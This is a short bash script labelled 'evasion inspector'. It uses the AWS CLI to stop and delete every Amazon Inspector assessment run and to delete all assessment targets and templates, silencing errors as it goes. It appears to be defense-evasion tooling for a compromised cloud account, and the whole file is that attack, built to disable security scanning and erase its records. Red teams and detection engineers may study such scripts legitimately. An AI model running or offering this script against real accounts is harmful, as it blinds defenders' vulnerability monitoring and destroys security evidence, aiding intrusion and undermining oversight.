#!/bin/bash

yum install -y jq
opts="--output json --color off --no-cli-pager"
# evasion inspector
for row in $(aws inspector list-assessment-runs --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    echo "Running: aws inspector stop-assessment-run --assessment-run-arn \"$ID\" $opts"
    aws inspector stop-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
    echo "Running: aws inspector delete-assessment-run --assessment-run-arn \"$ID\" $opts"
    aws inspector delete-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-targets --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    echo "Running: aws inspector delete-assessment-target --assessment-target-arn \"$ID\" $opts"
    aws inspector delete-assessment-target --assessment-target-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-templates --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    echo "Running: aws inspector delete-assessment-template --assessment-template-arn \"$ID\" $opts"
    aws inspector delete-assessment-template --assessment-template-arn "$ID" $opts > /dev/null 2>&1
done